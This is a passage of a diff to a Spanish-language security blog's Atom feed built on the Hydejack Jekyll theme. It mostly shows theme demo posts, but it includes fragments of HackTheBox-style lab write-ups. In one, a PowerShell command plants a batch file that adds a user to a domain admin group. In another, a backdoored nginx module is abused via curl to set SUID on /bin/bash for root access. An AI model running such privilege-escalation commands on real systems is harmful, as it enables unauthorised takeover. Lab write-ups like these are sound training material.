-Invoke-Command <span class="nt">-ComputerName</span> ATSSERVER <span class="nt">-ConfigurationName</span> dc_manage <span class="nt">-Credential</span> <span class="nv">$cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span>Set-Content C:<span class="se">\P</span>ROGRA~1<span class="se">\k</span>eepmeon<span class="se">\p</span>wned.bat <span class="nt">-Value</span> <span class="s1">'net group Site_Admin awallace /domain /add'</span><span class="o">}</span>
-</code></pre></div></div>]]></content><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><category term="machines" /><summary type="html"><![CDATA[Lo más relevante de esta máquina fue]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/acutepng.png" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/acutepng.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">CPTS</title><link href="http://localhost:4000/certifications/cpts.html" rel="alternate" type="text/html" title="CPTS" /><published>2023-07-14T00:00:00-06:00</published><updated>2023-07-14T00:00:00-06:00</updated><id>http://localhost:4000/certifications/cpts</id><content type="html" xml:base="http://localhost:4000/certifications/cpts.html"><![CDATA[<p>El certificado que más me consto económica y mentalmente.</p>]]></content><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><category term="certifications" /><summary type="html"><![CDATA[El certificado que más me consto económica y mentalmente.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/certifications/CPTS.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/certifications/CPTS.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">PNPT</title><link href="http://localhost:4000/certifications/pnpt.html" rel="alternate" type="text/html" title="PNPT" /><published>2023-06-01T00:00:00-06:00</published><updated>2023-06-01T00:00:00-06:00</updated><id>http://localhost:4000/certifications/pnpt</id><content type="html" xml:base="http://localhost:4000/certifications/pnpt.html"><![CDATA[<p>El certificado que más me consto económica y mentalmente.</p>]]></content><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><category term="certifications" /><summary type="html"><![CDATA[El certificado que más me consto económica y mentalmente.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/certifications/PNPT.png" /><media:content medium="image" url="http://localhost:4000/assets/img/certifications/PNPT.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">What’s New in Hydejack 9.1?</title><link href="http://localhost:4000/whats-new-in-hydejack-9-1.html" rel="alternate" type="text/html" title="What’s New in Hydejack 9.1?" /><published>2021-02-13T00:00:00-06:00</published><updated>2021-02-13T00:00:00-06:00</updated><id>http://localhost:4000/whats-new-in-hydejack-9-1</id><content type="html" xml:base="http://localhost:4000/whats-new-in-hydejack-9-1.html"><![CDATA[<p>What’s New in Hydejack 9.1?</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@gobox:/etc/nginx/modules-enabled<span class="nv">$ </span><span class="nb">ls
+</span>50-backdoor.conf	      50-mod-http-xslt-filter.conf  50-mod-stream.conf
+50-mod-http-image-filter.conf  50-mod-mail.conf
+www-data@gobox:/etc/nginx/modules-enabled<span class="nv">$ </span><span class="nb">cat </span>50-backdoor.conf 
+load_module modules/ngx_http_execute_module.so<span class="p">;</span>
+www-data@gobox:/etc/nginx/modules-enabled<span class="nv">$ </span>find / <span class="nt">-name</span> ngx_http_execute_module.so 2&gt;/dev/null
+/usr/lib/nginx/modules/ngx_http_execute_module.so
+www-data@gobox:/etc/nginx/modules-enabled<span class="nv">$ </span>strings /usr/lib/nginx/modules/ngx_http_execute_module.so | <span class="nb">grep</span> <span class="s2">".run"</span>
+ippsec.run
+</code></pre></div></div>
+<p>Vemos que la máquina había sido vulnerada antes, y tiene un archivo <code class="language-plaintext highlighter-rouge">ngx_http_execute_module.so</code> buscando en google se ve que se puede ejecutar comandos con curl, pero al hacer un strings al archivo
+observamos que hay un <code class="language-plaintext highlighter-rouge">ippsec.run</code> que sustituye al system.run en curl.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@gobox:/etc/nginx/modules-enabled<span class="nv">$ </span>curl <span class="s1">'http://localhost:8000/?ippsec.run[whoami]'</span>
+root
+www-data@gobox:/etc/nginx/modules-enabled<span class="nv">$ </span>curl <span class="s2">"http://localhost:8000/?ippsec.run[chmod%204755%20%2fbin%2fbash]"</span>
+curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
+www-data@gobox:/etc/nginx/modules-enabled<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /bin/bash
+<span class="nt">-rwsr-xr-x</span> 1 root root 1183448 Jun 18  2020 /bin/bash
+</code></pre></div></div>
+<p>Hacemos un bash -p y estamos dentro como root.</p>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="machines" /><category term="htb" /><summary type="html"><![CDATA[Vemos el puerto 80 y 8080, donde en el puerto 80 no encontramos nada interesante pero en el 8080 encontramos un login.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/machines/axlle/axlle1.JPG" /><media:content medium="image" url="http://localhost:4000/assets/img/machines/axlle/axlle1.JPG" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">What’s New in Hydejack 9.1?</title><link href="http://localhost:4000/blog/example/2021-02-13-whats-new-in-hydejack-9-1/" rel="alternate" type="text/html" title="What’s New in Hydejack 9.1?" /><published>2021-02-13T00:00:00-06:00</published><updated>2021-02-13T00:00:00-06:00</updated><id>http://localhost:4000/blog/example/whats-new-in-hydejack-9-1</id><content type="html" xml:base="http://localhost:4000/blog/example/2021-02-13-whats-new-in-hydejack-9-1/"><![CDATA[<p>What’s New in Hydejack 9.1?</p>
 
 <ul id="markdown-toc">
   <li><a href="#stripe-ified-design" id="markdown-toc-stripe-ified-design">Stripe-ified Design</a></li>
@@ -662,7 +668,7 @@ For more, see <a href="https://getclaps.app/">the dedicated website</a>.</p>
 
 <h2 id="credits">Credits</h2>
 
-<p><span>Photo by <a href="https://unsplash.com/@jjying?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">JJ Ying</a> on <a href="https://unsplash.com/?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></span></p>]]></content><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><summary type="html"><![CDATA[Version 9.1 provides minor design changes, new features, and closes multiple issues.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/jj-ying.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/jj-ying.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Introducing Hydejack 9</title><link href="http://localhost:4000/introducing-hydejack-9.html" rel="alternate" type="text/html" title="Introducing Hydejack 9" /><published>2020-07-03T00:00:00-05:00</published><updated>2020-07-03T00:00:00-05:00</updated><id>http://localhost:4000/introducing-hydejack-9</id><content type="html" xml:base="http://localhost:4000/introducing-hydejack-9.html"><![CDATA[<p class="lead">Version 9 is the most complete version of Hydejack yet.</p>
+<p><span>Photo by <a href="https://unsplash.com/@jjying?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">JJ Ying</a> on <a href="https://unsplash.com/?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></span></p>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="example" /><summary type="html"><![CDATA[Version 9.1 provides minor design changes, new features, and closes multiple issues.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/jj-ying.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/jj-ying.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Introducing Hydejack 9</title><link href="http://localhost:4000/blog/example/2020-07-03-introducing-hydejack-9/" rel="alternate" type="text/html" title="Introducing Hydejack 9" /><published>2020-07-03T00:00:00-05:00</published><updated>2020-07-03T00:00:00-05:00</updated><id>http://localhost:4000/blog/example/introducing-hydejack-9</id><content type="html" xml:base="http://localhost:4000/blog/example/2020-07-03-introducing-hydejack-9/"><![CDATA[<p class="lead">Version 9 is the most complete version of Hydejack yet.</p>
 
 <p><a href="#linking-in-style">Modernized</a> <a href="#whats-in-the-cards">design</a>, <a href="#ready-for-the-big-screen">big headlines</a>, big new features: <a href="#built-in-search">Built-In Search</a>, <a href="#sticky-table-of-contents">Sticky Table of Contents</a>, and <a href="#auto-hiding-navbar">Auto-Hiding Navbar</a>. That <a href="#and-much-more">and more</a> is Hydejack 9.</p>
 
@@ -693,7 +699,7 @@ For more, see <a href="https://getclaps.app/">the dedicated website</a>.</p>
 <p>Hydejack 9 now lets you use content cards for both projects and posts. 
 The cards have been redesigned with a new hover style and drop shadows and they retain their unique transition-to-next-page animations, which now also work on the <code class="language-plaintext highlighter-rouge">blog</code> layout. The new <code class="language-plaintext highlighter-rouge">grid</code> layout lets you do that.</p>
 
-<p>Good images are key to making the most out of content cards. For that reason, a <a href="/docs/basics.html#adding-images">chapter on images</a> has been added to the documentation.</p>
+<p>Good images are key to making the most out of content cards. For that reason, a <a href="/docs/basics/#adding-images">chapter on images</a> has been added to the documentation.</p>
 
 <h2 id="built-in-search">Built-In Search</h2>
 
@@ -723,7 +729,7 @@ What’s unique about it is that it simply picks up the table of contents alread
   <li>…and the option to disable grouping projects by year.</li>
 </ul>
 
-<p>Read the the <a href="/CHANGELOG.html" class="heading flip-title">CHANGELOG</a> for the full scope of features and improvements made in Hydejack 9.
+<p>Read the the <a href="/CHANGELOG/" class="heading flip-title">CHANGELOG</a> for the full scope of features and improvements made in Hydejack 9.
 Maybe just glance at it to confirm that it is indeed a pretty long list.</p>
 
 <h2 id="even-more-to-come">Even More to Come</h2>
@@ -751,7 +757,7 @@ The source code is available on <a href="https://github.com/hydecorp/hydejack">G
   If you’re technically inclined, you can adopt the code located in <code class="language-plaintext highlighter-rouge">_includes/js/search-worker.js</code> to your needs. <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
     </li>
   </ol>
-</div>]]></content><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><summary type="html"><![CDATA[Version 9 is the most complete version of Hydejack yet. Modernized design, big headlines, and big new features.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/jeremy-bishop@0,5x.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/jeremy-bishop@0,5x.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Example Content III</title><link href="http://localhost:4000/example-content-iii.html" rel="alternate" type="text/html" title="Example Content III" /><published>2018-06-01T00:00:00-05:00</published><updated>2018-06-01T00:00:00-05:00</updated><id>http://localhost:4000/example-content-iii</id><content type="html" xml:base="http://localhost:4000/example-content-iii.html"><![CDATA[<p>Hydejack offers a few additional features to markup your markdown.
+</div>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="example" /><summary type="html"><![CDATA[Version 9 is the most complete version of Hydejack yet. Modernized design, big headlines, and big new features.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/jeremy-bishop@0,5x.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/jeremy-bishop@0,5x.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Example Content III</title><link href="http://localhost:4000/blog/example/2018-06-01-example-content-iii/" rel="alternate" type="text/html" title="Example Content III" /><published>2018-06-01T00:00:00-05:00</published><updated>2018-06-01T00:00:00-05:00</updated><id>http://localhost:4000/blog/example/example-content-iii</id><content type="html" xml:base="http://localhost:4000/blog/example/2018-06-01-example-content-iii/"><![CDATA[<p>Hydejack offers a few additional features to markup your markdown.
 Don’t worry, these are merely CSS classes added with kramdown’s <code class="language-plaintext highlighter-rouge">{:...}</code> syntax,
 so that your content remains compatible with other Jekyll themes.</p>
 
@@ -941,4 +947,194 @@ A caption to an image.</p>
 </blockquote>
 
 <h2 id="faded-text">Faded text</h2>
-<p class="faded">I’m faded, faded, faded.</p>]]></content><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><summary type="html"><![CDATA[A page showing Hydejack-specific markdown content.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/example-content-iii.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/example-content-iii.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p class="faded">I’m faded, faded, faded.</p>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="example" /><summary type="html"><![CDATA[A page showing Hydejack-specific markdown content.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/example-content-iii.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/example-content-iii.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Esto es una prueba!!!</title><link href="http://localhost:4000/blog/machines/2018-06-01-pruebaperroi/" rel="alternate" type="text/html" title="Esto es una prueba!!!" /><published>2018-06-01T00:00:00-05:00</published><updated>2018-06-01T00:00:00-05:00</updated><id>http://localhost:4000/blog/machines/pruebaperroi</id><content type="html" xml:base="http://localhost:4000/blog/machines/2018-06-01-pruebaperroi/"><![CDATA[<p>Hydejack offers a few additional features to markup your markdown.
+Don’t worry, these are merely CSS classes added with kramdown’s <code class="language-plaintext highlighter-rouge">{:...}</code> syntax,
+so that your content remains compatible with other Jekyll themes.</p>
+
+<h2 id="large-tables">Large Tables</h2>
+
+<table class="scroll-table">
+  <thead>
+    <tr>
+      <th>Default aligned</th>
+      <th style="text-align: left">Left aligned</th>
+      <th style="text-align: center">Center aligned</th>
+      <th style="text-align: right">Right aligned</th>
+      <th>Default aligned</th>
+      <th style="text-align: left">Left aligned</th>
+      <th style="text-align: center">Center aligned</th>
+      <th style="text-align: right">Right aligned</th>
+      <th>Default aligned</th>
+      <th style="text-align: left">Left aligned</th>
+      <th style="text-align: center">Center aligned</th>
+      <th style="text-align: right">Right aligned</th>
+      <th>Default aligned</th>
+      <th style="text-align: left">Left aligned</th>
+      <th style="text-align: center">Center aligned</th>
+      <th style="text-align: right">Right aligned</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>First body part</td>
+      <td style="text-align: left">Second cell</td>
+      <td style="text-align: center">Third cell</td>
+      <td style="text-align: right">fourth cell</td>
+      <td>First body part</td>
+      <td style="text-align: left">Second cell</td>
+      <td style="text-align: center">Third cell</td>
+      <td style="text-align: right">fourth cell</td>
+      <td>First body part</td>
+      <td style="text-align: left">Second cell</td>
+      <td style="text-align: center">Third cell</td>
+      <td style="text-align: right">fourth cell</td>
+      <td>First body part</td>
+      <td style="text-align: left">Second cell</td>
+      <td style="text-align: center">Third cell</td>
+      <td style="text-align: right">fourth cell</td>
+    </tr>
+    <tr>
+      <td>Second line</td>
+      <td style="text-align: left">foo</td>
+      <td style="text-align: center"><strong>strong</strong></td>
+      <td style="text-align: right">baz</td>
+      <td>Second line</td>
+      <td style="text-align: left">foo</td>
+      <td style="text-align: center"><strong>strong</strong></td>
+      <td style="text-align: right">baz</td>
+      <td>Second line</td>
+      <td style="text-align: left">foo</td>
+      <td style="text-align: center"><strong>strong</strong></td>
+      <td style="text-align: right">baz</td>
+      <td>Second line</td>
+      <td style="text-align: left">foo</td>
+      <td style="text-align: center"><strong>strong</strong></td>
+      <td style="text-align: right">baz</td>
+    </tr>
+    <tr>
+      <td>Third line</td>
+      <td style="text-align: left">quux</td>
+      <td style="text-align: center">baz</td>
+      <td style="text-align: right">bar</td>
+      <td>Third line</td>
+      <td style="text-align: left">quux</td>
+      <td style="text-align: center">baz</td>
+      <td style="text-align: right">bar</td>
+      <td>Third line</td>
+      <td style="text-align: left">quux</td>
+      <td style="text-align: center">baz</td>
+      <td style="text-align: right">bar</td>
+      <td>Third line</td>
+      <td style="text-align: left">quux</td>
+      <td style="text-align: center">baz</td>
+      <td style="text-align: right">bar</td>
+    </tr>
+    <tr>
+      <td>Second body</td>
+      <td style="text-align: left"> </td>
+      <td style="text-align: center"> </td>
+      <td style="text-align: right"> </td>
+      <td>Second body</td>
+      <td style="text-align: left"> </td>
+      <td style="text-align: center"> </td>
+      <td style="text-align: right"> </td>
+      <td>Second body</td>
+      <td style="text-align: left"> </td>
+      <td style="text-align: center"> </td>
+      <td style="text-align: right"> </td>
+      <td>Second body</td>
+      <td style="text-align: left"> </td>
+      <td style="text-align: center"> </td>
+      <td style="text-align: right"> </td>
+    </tr>
+    <tr>
+      <td>2 line</td>
+      <td style="text-align: left"> </td>
+      <td style="text-align: center"> </td>
+      <td style="text-align: right"> </td>
+      <td>2 line</td>
+      <td style="text-align: left"> </td>
+      <td style="text-align: center"> </td>
+      <td style="text-align: right"> </td>
+      <td>2 line</td>
+      <td style="text-align: left"> </td>
+      <td style="text-align: center"> </td>
+      <td style="text-align: right"> </td>
+      <td>2 line</td>
+      <td style="text-align: left"> </td>
+      <td style="text-align: center"> </td>
+      <td style="text-align: right"> </td>
+    </tr>
+    <tr>
+      <td>Footer row</td>
+      <td style="text-align: left"> </td>
+      <td style="text-align: center"> </td>
+      <td style="text-align: right"> </td>
+      <td>Footer row</td>
+      <td style="text-align: left"> </td>
+      <td style="text-align: center"> </td>
+      <td style="text-align: right"> </td>
+      <td>Footer row</td>
+      <td style="text-align: left"> </td>
+      <td style="text-align: center"> </td>
+      <td style="text-align: right"> </td>
+      <td>Footer row</td>
+      <td style="text-align: left"> </td>
+      <td style="text-align: center"> </td>
+      <td style="text-align: right"> </td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="code-blocks">Code blocks</h2>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Example can be run directly in your JavaScript console</span>
+
+<span class="c1">// Create a function that takes two arguments and returns the sum of those</span>
+<span class="c1">// arguments</span>
+<span class="kd">var</span> <span class="nx">adder</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Function</span><span class="p">(</span><span class="dl">"</span><span class="s2">a</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">b</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">return a + b</span><span class="dl">"</span><span class="p">);</span>
+
+<span class="c1">// Call the function</span>
+<span class="nx">adder</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>
+<span class="c1">// &gt; 8</span>
+</code></pre></div></div>
+
+<h2 id="math">Math</h2>
+<p>Lorem ipsum \(f(x) = x^2\).</p>
+
+\[\begin{aligned}
+  \phi(x,y) &amp;= \phi \left(\sum_{i=1}^n x_ie_i, \sum_{j=1}^n y_je_j \right) \\[2em]
+            &amp;= \sum_{i=1}^n \sum_{j=1}^n x_i y_j \phi(e_i, e_j)            \\[2em]
+            &amp;= (x_1, \ldots, x_n)
+               \left(\begin{array}{ccc}
+                 \phi(e_1, e_1)  &amp; \cdots &amp; \phi(e_1, e_n) \\
+                 \vdots          &amp; \ddots &amp; \vdots         \\
+                 \phi(e_n, e_1)  &amp; \cdots &amp; \phi(e_n, e_n)
+               \end{array}\right)
+               \left(\begin{array}{c}
+                 y_1    \\
+                 \vdots \\
+                 y_n
+               \end{array}\right)
+\end{aligned}\]
+
+<h2 id="message-boxes">Message boxes</h2>
+<p class="message"><strong>NOTE</strong>: You can add a message box.</p>
+
+<h2 id="large-text">Large text</h2>
+<p class="lead">You can add large text.</p>
+
+<h2 id="large-images">Large images</h2>
+<p><img src="https://via.placeholder.com/800x100" alt="Full-width image" class="lead" width="800" height="100" /></p>
+
+<h2 id="captions-to-images">Captions to images</h2>
+<p class="figure"><img src="https://via.placeholder.com/800x100" alt="Full-width image" class="lead" width="800" height="100" />
+A caption to an image.</p>
+
+<h2 id="large-quotes">Large quotes</h2>
+<blockquote class="lead">
+  <p>You can make a quote “pop out”.</p>
+</blockquote>
+
+<h2 id="faded-text">Faded text</h2>
+<p class="faded">I’m faded, faded, faded.</p>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="machines" /><summary type="html"><![CDATA[A page showing Hydejack-specific markdown content.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/example-content-iii.jpg" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/example-content-iii.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
